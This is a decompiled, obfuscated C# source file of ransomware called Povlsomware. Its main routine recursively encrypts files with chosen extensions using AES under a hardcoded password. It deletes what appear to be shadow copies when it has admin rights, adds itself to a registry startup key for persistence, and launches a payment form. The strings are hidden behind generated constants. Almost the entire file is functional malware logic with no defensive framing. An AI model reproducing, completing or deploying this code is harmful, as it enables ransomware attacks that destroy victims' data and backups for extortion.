using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using Povlsomware;

internal class Povlsomware_Program_002D2
{
	[CompilerGenerated]
	private sealed class Class0
	{
		public string file;

		internal bool _003CProcessDirectory_003Eb__1_002D0(string x_002D0)
		{
			return file.EndsWith(x_002D0, StringComparison.OrdinalIgnoreCase);
		}
	}

	[Serializable]
	[CompilerGenerated]
	private sealed class Class1
	{
		public static readonly Class1 _003C_003E9 = new Class1();

		public static Func<string, bool> _003C_003E9__17_0;

		internal bool _003CProcessDirectory_003Eb__17_0_002D0(string file_002D0)
		{
			Class0 CS_0024_003C_003E8__locals0 = new Class0
			{
				file = file_002D0
			};
			return extensionsToEncrypt_002D3.Any((string x_002D0) => CS_0024_003C_003E8__locals0.file.EndsWith(x_002D0, StringComparison.OrdinalIgnoreCase));
		}
	}

	private const int SW_HIDE_002D0 = 0;

	private const int SW_SHOW_002D1 = 5;

	public static int count = 0;

	public static List<string> encryptedFiles = new List<string>();

	private static char[] password_002D2 = new char[1] { (char)_Constants_Generated_002D7.Field_189_002D33 };

	private static readonly string[] extensionsToEncrypt_002D3;

	[DllImport("User32")]
	private static extern int ShowWindow(int hwnd_002D0, int nCmdShow_002D1);

	[DllImport("user32.dll")]
	private static extern bool BlockInput(bool block_002D0);

	[STAThread]
	public static char[] GetPass()
	{
		return password_002D2;
	}

	private static void Main_002D0()
	{
		Attack();
		DestroyCopy();
		SetStartup_002D1();
		CreateUI_002D2();
	}

	private static void SetStartup_002D1()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(_Constants_Generated_002D7.Field_154_002Du2, writable: true);
		if (registryKey.GetValue(_Constants_Generated_002D7.Field_155_002Dv2) == null && !Application.get_ExecutablePath().Contains(_Constants_Generated_002D7.Field_156_002Dw2))
		{
			registryKey.SetValue(_Constants_Generated_002D7.Field_157_002Dx2, _Constants_Generated_002D7.Field_158_002Dy2 + Application.get_ExecutablePath() + _Constants_Generated_002D7.Field_159_002Dz2);
		}
	}

	private static void CreateUI_002D2()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new PayM3());
	}

	public static void DecryptFile(string fileEncrypted_002D0, string password_002D1)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password_002D1);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] array = AES_Decrypt(File.ReadAllBytes(fileEncrypted_002D0).Skip(4).ToArray(), bytes);
		FileStream fileStream = File.Open(fileEncrypted_002D0, FileMode.Open);
		fileStream.SetLength(0L);
		fileStream.Close();
		using FileStream fileStream2 = new FileStream(fileEncrypted_002D0, FileMode.Append);
		fileStream2.Write(array, 0, array.Length);
		Console.WriteLine(_Constants_Generated_002D7.Field_160_002DA2 + fileEncrypted_002D0);
	}

	public static void DestroyCopy()
	{
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		bool flag;
		using (WindowsIdentity ntIdentity = WindowsIdentity.GetCurrent())
		{
			flag = new WindowsPrincipal(ntIdentity).IsInRole((WindowsBuiltInRole)_Constants_Generated_002D7.Field_161_002DB2);
		}
		if (!flag)
		{
			return;
		}
		ManagementClass val = new ManagementClass(string.Concat(_Constants_Generated_002D7.Field_162_002DC2, str2: _Constants_Generated_002D7.Field_163_002DD2, str1: _Constants_Generated_002D7.Field_164_002DE2));
		try
		{
			ManagementObjectEnumerator enumerator = val.GetInstances().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					((ManagementObject)enumerator.get_Current()).Delete();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(_Constants_Generated_002D7.Field_165_002DF2 + ex.Message);
		}
	}

	public static void EncryptFile(string fileUnencrypted_002D0)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password_002D2);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] array = AES_Encrypt(File.ReadAllBytes(fileUnencrypted_002D0), bytes);
		FileStream fileStream = File.Open(fileUnencrypted_002D0, FileMode.Open);
		fileStream.SetLength(0L);
		fileStream.Close();
		using FileStream fileStream2 = new FileStream(fileUnencrypted_002D0, FileMode.Append);
		if (fileStream2.CanWrite)
		{
			byte[] bytes2 = Encoding.UTF8.GetBytes(_Constants_Generated_002D7.Field_166_002DG2);
			fileStream2.Write(bytes2, 0, bytes2.Length);
			fileStream2.Write(array, 0, array.Length);
			Console.WriteLine(_Constants_Generated_002D7.Field_167_002DH2 + fileUnencrypted_002D0);
			count++;
			encryptedFiles.Add(fileUnencrypted_002D0);
		}
	}

	public static void Attack()
	{
		ProcessDirectory(_Constants_Generated_002D7.Field_168_002DI2, 1, _Constants_Generated_002D7.Field_169_002DJ2);
	}

	public static void UndoAttack(string decryption_password_002D0)
	{
		ProcessDirectory(_Constants_Generated_002D7.Field_170_002DK2, 0, decryption_password_002D0);
	}

	public static void ProcessDirectory(string targetDirectory_002D0, int action_002D1, string password_002D2)
	{
		foreach (string item in from file_002D0 in Directory.EnumerateFiles(targetDirectory_002D0, _Constants_Generated_002D7.Field_171_002DL2)
			where extensionsToEncrypt_002D3.Any((string x_002D0) => file_002D0.EndsWith(x_002D0, StringComparison.OrdinalIgnoreCase))
			select file_002D0)
		{
			ProcessFile(item, action_002D1, password_002D2);
		}
		string[] directories = Directory.GetDirectories(targetDirectory_002D0);
		foreach (string text in directories)
		{
			try
			{
				if (!text.Contains(_Constants_Generated_002D7.Field_172_002DM2) && !text.Contains(_Constants_Generated_002D7.Field_173_002DN2) && !text.Contains(_Constants_Generated_002D7.Field_174_002DO2) && !text.Contains(_Constants_Generated_002D7.Field_175_002DP2) && !text.Contains(_Constants_Generated_002D7.Field_176_002DQ2) && !text.Contains(_Constants_Generated_002D7.Field_177_002DR2) && !text.Contains(_Constants_Generated_002D7.Field_178_002DS2) && !text.Contains(_Constants_Generated_002D7.Field_179_002DT2) && !text.Contains(_Constants_Generated_002D7.Field_180_002DU2) && !text.Contains(_Constants_Generated_002D7.Field_181_002DV2))
				{
					ProcessDirectory(text, action_002D1, password_002D2);
				}
			}
			catch
			{
			}
		}
	}

	public static bool IsMarked(string fileName_002D0)
	{
		byte[] bytes = Encoding.ASCII.GetBytes(_Constants_Generated_002D7.Field_182_002DW2);
		byte[] second = File.ReadAllBytes(fileName_002D0).Take(4).ToArray();
		if (bytes.SequenceEqual(second))
		{
			count++;
			encryptedFiles.Add(fileName_002D0);
			return true;
		}
		return false;
	}

	public static void ProcessFile(string fileName_002D0, int action_002D1, string password_002D2)
	{
		if (action_002D1 == 1 && !IsMarked(fileName_002D0))
		{
			try
			{
				EncryptFile(fileName_002D0);
				return;
			}
			catch
			{
				return;
			}
		}
		if (action_002D1 == 0 && IsMarked(fileName_002D0))
		{
			try
			{
				DecryptFile(fileName_002D0, password_002D2);
			}
			catch
			{
			}
		}
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted_002D0, byte[] passwordBytes_002D1)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = _Constants_Generated_002D7.Field_183_002DX2;
		rijndaelManaged.BlockSize = _Constants_Generated_002D7.Field_184_002DY2;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes_002D1, salt, _Constants_Generated_002D7.Field_185_002DZ2);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted_002D0, 0, bytesToBeEncrypted_002D0.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted_002D0, byte[] passwordBytes_002D1)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = _Constants_Generated_002D7.Field_186_002D03;
		rijndaelManaged.BlockSize = _Constants_Generated_002D7.Field_187_002D13;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes_002D1, salt, _Constants_Generated_002D7.Field_188_002D23);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeDecrypted_002D0, 0, bytesToBeDecrypted_002D0.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	static Povlsomware_Program_002D2()
	{
		string[] array = new string[_Constants_Generated_002D7.Field_190_002D43];
		array[0] = _Constants_Generated_002D7.Field_191_002D53;
		array[1] = _Constants_Generated_002D7.Field_192_002D63;
		array[2] = _Constants_Generated_002D7.Field_193_002D73;
		array[3] = _Constants_Generated_002D7.Field_194_002D83;
		array[4] = _Constants_Generated_002D7.Field_195_002D93;
		array[5] = _Constants_Generated_002D7.Field_196_002Da3;
		array[6] = _Constants_Generated_002D7.Field_197_002Db3;
		array[7] = _Constants_Generated_002D7.Field_198_002Dc3;
		array[8] = _Constants_Generated_002D7.Field_199_002Dd3;
		array[_Constants_Generated_002D7.Field_200_002De3] = _Constants_Generated_002D7.Field_201_002Df3;
		array[_Constants_Generated_002D7.Field_202_002Dg3] = _Constants_Generated_002D7.Field_203_002Dh3;
		array[_Constants_Generated_002D7.Field_204_002Di3] = _Constants_Generated_002D7.Field_205_002Dj3;
		array[_Constants_Generated_002D7.Field_206_002Dk3] = _Constants_Generated_002D7.Field_207_002Dl3;
		array[_Constants_Generated_002D7.Field_208_002Dm3] = _Constants_Generated_002D7.Field_209_002Dn3;
		array[_Constants_Generated_002D7.Field_210_002Do3] = _Constants_Generated_002D7.Field_211_002Dp3;
		array[_Constants_Generated_002D7.Field_212_002Dq3] = _Constants_Generated_002D7.Field_213_002Dr3;
		array[_Constants_Generated_002D7.Field_214_002Ds3] = _Constants_Generated_002D7.Field_215_002Dt3;
		array[_Constants_Generated_002D7.Field_216_002Du3] = _Constants_Generated_002D7.Field_217_002Dv3;
		array[_Constants_Generated_002D7.Field_218_002Dw3] = _Constants_Generated_002D7.Field_219_002Dx3;
		array[_Constants_Generated_002D7.Field_220_002Dy3] = _Constants_Generated_002D7.Field_221_002Dz3;
		array[_Constants_Generated_002D7.Field_222_002DA3] = _Constants_Generated_002D7.Field_223_002DB3;
		array[_Constants_Generated_002D7.Field_224_002DC3] = _Constants_Generated_002D7.Field_225_002DD3;
		array[_Constants_Generated_002D7.Field_226_002DE3] = _Constants_Generated_002D7.Field_227_002DF3;
		array[_Constants_Generated_002D7.Field_228_002DG3] = _Constants_Generated_002D7.Field_229_002DH3;
		array[_Constants_Generated_002D7.Field_230_002DI3] = _Constants_Generated_002D7.Field_231_002DJ3;
		array[_Constants_Generated_002D7.Field_232_002DK3] = _Constants_Generated_002D7.Field_233_002DL3;
		array[_Constants_Generated_002D7.Field_234_002DM3] = _Constants_Generated_002D7.Field_235_002DN3;
		array[_Constants_Generated_002D7.Field_236_002DO3] = _Constants_Generated_002D7.Field_237_002DP3;
		array[_Constants_Generated_002D7.Field_238_002DQ3] = _Constants_Generated_002D7.Field_239_002DR3;
		array[_Constants_Generated_002D7.Field_240_002DS3] = _Constants_Generated_002D7.Field_241_002DT3;
		array[_Constants_Generated_002D7.Field_242_002DU3] = _Constants_Generated_002D7.Field_243_002DV3;
		array[_Constants_Generated_002D7.Field_244_002DW3] = _Constants_Generated_002D7.Field_245_002DX3;
		array[_Constants_Generated_002D7.Field_246_002DY3] = _Constants_Generated_002D7.Field_247_002DZ3;
		array[_Constants_Generated_002D7.Field_248_002D04] = _Constants_Generated_002D7.Field_249_002D14;
		array[_Constants_Generated_002D7.Field_250_002D24] = _Constants_Generated_002D7.Field_251_002D34;
		array[_Constants_Generated_002D7.Field_252_002D44] = _Constants_Generated_002D7.Field_253_002D54;
		array[_Constants_Generated_002D7.Field_254_002D64] = _Constants_Generated_002D7.Field_255_002D74;
		array[_Constants_Generated_002D7.Field_256_002D84] = _Constants_Generated_002D7.Field_257_002D94;
		array[_Constants_Generated_002D7.Field_258_002Da4] = _Constants_Generated_002D7.Field_259_002Db4;
		array[_Constants_Generated_002D7.Field_260_002Dc4] = _Constants_Generated_002D7.Field_261_002Dd4;
		array[_Constants_Generated_002D7.Field_262_002De4] = _Constants_Generated_002D7.Field_263_002Df4;
		array[_Constants_Generated_002D7.Field_264_002Dg4] = _Constants_Generated_002D7.Field_265_002Dh4;
		array[_Constants_Generated_002D7.Field_266_002Di4] = _Constants_Generated_002D7.Field_267_002Dj4;
		array[_Constants_Generated_002D7.Field_268_002Dk4] = _Constants_Generated_002D7.Field_269_002Dl4;
		array[_Constants_Generated_002D7.Field_270_002Dm4] = _Constants_Generated_002D7.Field_271_002Dn4;
		array[_Constants_Generated_002D7.Field_272_002Do4] = _Constants_Generated_002D7.Field_273_002Dp4;
		array[_Constants_Generated_002D7.Field_274_002Dq4] = _Constants_Generated_002D7.Field_275_002Dr4;
		array[_Constants_Generated_002D7.Field_276_002Ds4] = _Constants_Generated_002D7.Field_277_002Dt4;
		array[_Constants_Generated_002D7.Field_278_002Du4] = _Constants_Generated_002D7.Field_279_002Dv4;
		array[_Constants_Generated_002D7.Field_280_002Dw4] = _Constants_Generated_002D7.Field_281_002Dx4;
		array[_Constants_Generated_002D7.Field_282_002Dy4] = _Constants_Generated_002D7.Field_283_002Dz4;
		array[_Constants_Generated_002D7.Field_284_002DA4] = _Constants_Generated_002D7.Field_285_002DB4;
		array[_Constants_Generated_002D7.Field_286_002DC4] = _Constants_Generated_002D7.Field_287_002DD4;
		array[_Constants_Generated_002D7.Field_288_002DE4] = _Constants_Generated_002D7.Field_289_002DF4;
		array[_Constants_Generated_002D7.Field_290_002DG4] = _Constants_Generated_002D7.Field_291_002DH4;
		array[_Constants_Generated_002D7.Field_292_002DI4] = _Constants_Generated_002D7.Field_293_002DJ4;
		array[_Constants_Generated_002D7.Field_294_002DK4] = _Constants_Generated_002D7.Field_295_002DL4;
		array[_Constants_Generated_002D7.Field_296_002DM4] = _Constants_Generated_002D7.Field_297_002DN4;
		array[_Constants_Generated_002D7.Field_298_002DO4] = _Constants_Generated_002D7.Field_299_002DP4;
		array[_Constants_Generated_002D7.Field_300_002DQ4] = _Constants_Generated_002D7.Field_301_002DR4;
		array[_Constants_Generated_002D7.Field_302_002DS4] = _Constants_Generated_002D7.Field_303_002DT4;
		array[_Constants_Generated_002D7.Field_304_002DU4] = _Constants_Generated_002D7.Field_305_002DV4;
		array[_Constants_Generated_002D7.Field_306_002DW4] = _Constants_Generated_002D7.Field_307_002DX4;
		array[_Constants_Generated_002D7.Field_308_002DY4] = _Constants_Generated_002D7.Field_309_002DZ4;
		array[_Constants_Generated_002D7.Field_310_002D05] = _Constants_Generated_002D7.Field_311_002D15;
		array[_Constants_Generated_002D7.Field_312_002D25] = _Constants_Generated_002D7.Field_313_002D35;
		array[_Constants_Generated_002D7.Field_314_002D45] = _Constants_Generated_002D7.Field_315_002D55;
		array[_Constants_Generated_002D7.Field_316_002D65] = _Constants_Generated_002D7.Field_317_002D75;
		array[_Constants_Generated_002D7.Field_318_002D85] = _Constants_Generated_002D7.Field_319_002D95;
		array[_Constants_Generated_002D7.Field_320_002Da5] = _Constants_Generated_002D7.Field_321_002Db5;
		array[_Constants_Generated_002D7.Field_322_002Dc5] = _Constants_Generated_002D7.Field_323_002Dd5;
		array[_Constants_Generated_002D7.Field_324_002De5] = _Constants_Generated_002D7.Field_325_002Df5;
		array[_Constants_Generated_002D7.Field_326_002Dg5] = _Constants_Generated_002D7.Field_327_002Dh5;
		array[_Constants_Generated_002D7.Field_328_002Di5] = _Constants_Generated_002D7.Field_329_002Dj5;
		array[_Constants_Generated_002D7.Field_330_002Dk5] = _Constants_Generated_002D7.Field_331_002Dl5;
		array[_Constants_Generated_002D7.Field_332_002Dm5] = _Constants_Generated_002D7.Field_333_002Dn5;
		array[_Constants_Generated_002D7.Field_334_002Do5] = _Constants_Generated_002D7.Field_335_002Dp5;
		array[_Constants_Generated_002D7.Field_336_002Dq5] = _Constants_Generated_002D7.Field_337_002Dr5;
		array[_Constants_Generated_002D7.Field_338_002Ds5] = _Constants_Generated_002D7.Field_339_002Dt5;
		array[_Constants_Generated_002D7.Field_340_002Du5] = _Constants_Generated_002D7.Field_341_002Dv5;
		array[_Constants_Generated_002D7.Field_342_002Dw5] = _Constants_Generated_002D7.Field_343_002Dx5;
		array[_Constants_Generated_002D7.Field_344_002Dy5] = _Constants_Generated_002D7.Field_345_002Dz5;
		array[_Constants_Generated_002D7.Field_346_002DA5] = _Constants_Generated_002D7.Field_347_002DB5;
		array[_Constants_Generated_002D7.Field_348_002DC5] = _Constants_Generated_002D7.Field_349_002DD5;
		array[_Constants_Generated_002D7.Field_350_002DE5] = _Constants_Generated_002D7.Field_351_002DF5;
		array[_Constants_Generated_002D7.Field_352_002DG5] = _Constants_Generated_002D7.Field_353_002DH5;
		array[_Constants_Generated_002D7.Field_354_002DI5] = _Constants_Generated_002D7.Field_355_002DJ5;
		array[_Constants_Generated_002D7.Field_356_002DK5] = _Constants_Generated_002D7.Field_357_002DL5;
		array[_Constants_Generated_002D7.Field_358_002DM5] = _Constants_Generated_002D7.Field_359_002DN5;
		array[_Constants_Generated_002D7.Field_360_002DO5] = _Constants_Generated_002D7.Field_361_002DP5;
		array[_Constants_Generated_002D7.Field_362_002DQ5] = _Constants_Generated_002D7.Field_363_002DR5;
		array[_Constants_Generated_002D7.Field_364_002DS5] = _Constants_Generated_002D7.Field_365_002DT5;
		array[_Constants_Generated_002D7.Field_366_002DU5] = _Constants_Generated_002D7.Field_367_002DV5;
		array[_Constants_Generated_002D7.Field_368_002DW5] = _Constants_Generated_002D7.Field_369_002DX5;
		array[_Constants_Generated_002D7.Field_370_002DY5] = _Constants_Generated_002D7.Field_371_002DZ5;
		array[_Constants_Generated_002D7.Field_372_002D06] = _Constants_Generated_002D7.Field_373_002D16;
		array[_Constants_Generated_002D7.Field_374_002D26] = _Constants_Generated_002D7.Field_375_002D36;
		array[_Constants_Generated_002D7.Field_376_002D46] = _Constants_Generated_002D7.Field_377_002D56;
		array[_Constants_Generated_002D7.Field_378_002D66] = _Constants_Generated_002D7.Field_379_002D76;
		array[_Constants_Generated_002D7.Field_380_002D86] = _Constants_Generated_002D7.Field_381_002D96;
		array[_Constants_Generated_002D7.Field_382_002Da6] = _Constants_Generated_002D7.Field_383_002Db6;
		array[_Constants_Generated_002D7.Field_384_002Dc6] = _Constants_Generated_002D7.Field_385_002Dd6;
		extensionsToEncrypt_002D3 = array;
	}
}
